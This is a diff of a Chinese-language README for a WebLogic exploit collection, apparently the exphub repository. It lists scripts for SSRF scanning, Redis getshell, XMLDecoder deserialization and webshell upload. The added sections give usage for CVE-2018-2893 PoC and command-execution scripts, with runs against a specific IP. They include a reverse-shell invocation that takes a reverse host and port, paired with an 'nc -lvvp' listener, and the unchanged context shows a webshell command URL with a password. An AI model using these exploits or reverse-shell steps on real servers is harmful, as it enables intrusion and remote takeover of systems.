@@ -2,11 +2,11 @@
 > WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。
 
 # Vulnerability list
-[**cve-2014-4210_ssrf_scan.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2014-4210_ssrf_scan.py) Weblogic ssrf扫描内网端口利用脚本 [[使用]](https://freeerror.org/d/483-ssrf)  
-[**cve-2014-4210_ssrf_redis_shell.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2014-4210_ssrf_redis_shell.py) Weblogic ssrf漏洞内网redis未授权getshell脚本[[使用]](https://freeerror.org/d/483-ssrf)  
-[**cve-2017-3506_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2017-3506_poc.py) Weblogic wls-wsat远程命令执行漏洞检测脚本[[使用]](https://freeerror.org/d/468-cve-2017-3506-weblogic-wls-wsat)  
-[**cve-2017-3506_webshell.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2017-3506_webshell.jar) Weblogic wls-wsat远程命令执行漏洞利用，上传Webshell[[使用]](https://freeerror.org/d/468-cve-2017-3506-weblogic-wls-wsat)  
-[**cve-2017-10271_poc.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic) Weblogic wls-wsat XMLDecoder反序列化漏洞检测脚本[[使用]](https://freeerror.org/d/460)
+[**cve-2014-4210_ssrf_scan.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2014-4210_ssrf_scan.py) Weblogic ssrf扫描内网端口利用脚本 [[使用]](https://freeerror.org/d/483)  
+[**cve-2014-4210_ssrf_redis_shell.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2014-4210_ssrf_redis_shell.py) Weblogic ssrf漏洞内网redis未授权getshell脚本[[使用]](https://freeerror.org/d/483)  
+[**cve-2017-3506_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2017-3506_poc.py) Weblogic wls-wsat远程命令执行漏洞检测脚本[[使用]](https://freeerror.org/d/468)  
+[**cve-2017-3506_webshell.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2017-3506_webshell.jar) Weblogic wls-wsat远程命令执行漏洞利用，上传Webshell[[使用]](https://freeerror.org/d/468)  
+[**cve-2017-10271_poc.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic) Weblogic wls-wsat XMLDecoder反序列化漏洞检测脚本[[使用]](https://freeerror.org/d/460)  
 [**cve-2017-10271_webshell.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic) Weblogic wls-wsat XMLDecoder反序列化漏洞利用脚本，上传Webshell[[使用]](https://freeerror.org/d/460)
 
 # Readme
@@ -179,4 +179,43 @@
 > [*] pwned! Go ahead...
 > 
 > [+] -u/bea_wls_internal/http://59.110.214.109:7001?password=secfree&command=whoami
+> ```
+
+## cve-2018-2893_poc.py WebLogic WLS核心组件反序列化漏洞检测脚本
+> VER:
+> ```
+> Oracle WebLogic Server 10.3.6.0
+> Oracle WebLogic Server 12.1.3.0
+> Oracle WebLogic Server 12.2.1.2
+> Oracle WebLogic Server 12.2.1.3
+> ```
+> USE:
+> ```
+> zhzy@debian:$ python cve-2018-2893_poc.py 
+> +--------------------------------------------------------+
+> + USE: python cve-2017-3506_poc.py <url:port>            +
+> + VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2  +
+> + EXP: python cve-2017-3506_poc.py 59.110.214.109:7001   +
+> +--------------------------------------------------------+
+> ```
+> EXP:
+> ```
+> zhzy@debian:$ python cve-2018-2893_poc.py 59.110.214.109 7001
+> [+] testing target
+> [+] send request payload successful,recv length:1700
+> [+] 59.110.214.109:7001 is vul CVE-2018-2893
+> ```
+
+## cve-2018-2893_cmd.py WebLogic WLS核心组件反序列化漏洞利用脚本
+> ```
+> zhzy@debian:$ python cve-2018-2893_cmd.py
+> +------------------------------------------------------------------------------+
+> + VER: Oracle WebLogic Server 10.3.6.0                                         +
+> +      Oracle WebLogic Server 12.1.3.0                                         +
+> +      Oracle WebLogic Server 12.2.1.2                                         +
+> +      Oracle WebLogic Server 12.2.1.3                                         +
+> + USE: python cve-2018-2893_cmd.py <host> <port> <reverse_host> <reverse_port> +
+> + EXP: python cve-2018-2893_cmd.py 1.1.1.1 7001 2.2.2.2 3333                   +
+> +      [2.2.2.2] nc -lvvp 3333                                                 +
+> +------------------------------------------------------------------------------+
 > ```
